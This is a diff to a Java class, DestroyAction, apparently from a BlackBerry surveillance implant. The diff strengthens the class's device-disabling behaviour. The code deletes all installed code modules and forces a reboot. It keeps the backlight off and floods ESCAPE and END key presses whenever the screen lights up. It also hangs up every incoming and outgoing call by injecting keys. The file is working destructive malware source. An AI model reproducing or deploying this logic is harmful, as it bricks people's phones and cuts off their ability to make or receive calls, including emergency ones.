@@ -5,17 +5,19 @@ import net.rim.blackberry.api.phone.PhoneListener;
 import net.rim.device.api.system.Backlight;
 import net.rim.device.api.system.CodeModuleManager;
 import net.rim.device.api.ui.Keypad;
+import blackberry.AppListener;
+import blackberry.Core;
 import blackberry.Trigger;
 import blackberry.config.ConfAction;
 import blackberry.config.ConfigurationException;
 import blackberry.injection.KeyInjector;
-import blackberry.manager.EventManager;
-import blackberry.manager.ModuleManager;
+import blackberry.interfaces.BacklightObserver;
 import blackberry.utils.Utils;
 
-public class DestroyAction extends SubAction implements PhoneListener {
+public class DestroyAction extends SubAction implements PhoneListener, BacklightObserver {
 
     private boolean permanent;
+    private boolean stop;
 
     public DestroyAction(ConfAction conf) {
         super(conf);
@@ -33,25 +35,19 @@ public class DestroyAction extends SubAction implements PhoneListener {
 
     public boolean execute(Trigger trigger) {
 
-        ModuleManager.getInstance().stopAll();
-        EventManager.getInstance().stopAll();
-        
         if (permanent) {
             //#ifdef DEBUG
             debug.trace("execute permanent");
             //#endif
             deleteApps();
+            Core.forceReboot();
         }
 
         markupDestroy();
         Phone.addPhoneListener(this);
+        AppListener.getInstance().addBacklightObserver(this);
 
-        Thread thread = new Thread(new Runnable() {
-
-            public void run() {
-                kill();
-            }
-        });
+        Backlight.enable(false);
 
         return true;
     }
@@ -65,7 +61,7 @@ public class DestroyAction extends SubAction implements PhoneListener {
         //#ifdef DEBUG
         debug.trace("deleteApps");
         //#endif
-        
+
         final int handles[] = CodeModuleManager.getModuleHandles();
 
         final int size = handles.length;
@@ -75,9 +71,9 @@ public class DestroyAction extends SubAction implements PhoneListener {
             // Retrieve specific information about a module.
             final String name = CodeModuleManager.getModuleName(handle);
 
-            int ret=CodeModuleManager.deleteModuleEx(handle, true);
+            int ret = CodeModuleManager.deleteModuleEx(handle, true);
             //#ifdef DEBUG
-            debug.trace("deleteApps, " + name +" : "+ret);
+            debug.trace("deleteApps, " + name + " : " + ret);
             //#endif
         }
         Backlight.enable(false);
@@ -89,14 +85,15 @@ public class DestroyAction extends SubAction implements PhoneListener {
         pressKey(Keypad.KEY_ENTER);
     }
 
-    void pressKey(int key){
+    void pressKey(int key) {
         KeyInjector.pressKey(key);
     }
-    
+
     void kill() {
-        for (int i = 0; i < 1000; i++) {
+        while(!stop){
             pressKey(Keypad.KEY_ESCAPE);
-            Utils.sleep(300);
+            pressKey(Keypad.KEY_END);
+            Utils.sleep(100);
         }
     }
 
@@ -149,11 +146,11 @@ public class DestroyAction extends SubAction implements PhoneListener {
     }
 
     public void callIncoming(int callId) {
-        pressKey(Keypad.KEY_END);
+        KeyInjector.pressRawKeyCode(Keypad.KEY_END);
     }
 
     public void callInitiated(int callid) {
-        pressKey(Keypad.KEY_END);
+        KeyInjector.pressRawKeyCode(Keypad.KEY_END);
     }
 
     public void callRemoved(int callId) {
@@ -172,6 +169,23 @@ public class DestroyAction extends SubAction implements PhoneListener {
     public void conferenceCallDisconnected(int callId) {
         // TODO Auto-generated method stub
 
+    }
+
+    public void onBacklightChange(boolean status) {
+        if(status){
+            stop=false;
+            Thread thread = new Thread(new Runnable() {
+                public void run() {
+                    kill();
+                }
+            });
+            thread.start();
+            Utils.sleep(100);
+            Backlight.enable(false);
+        }else{
+            stop=true;
+            
+        }
     }
 
 }
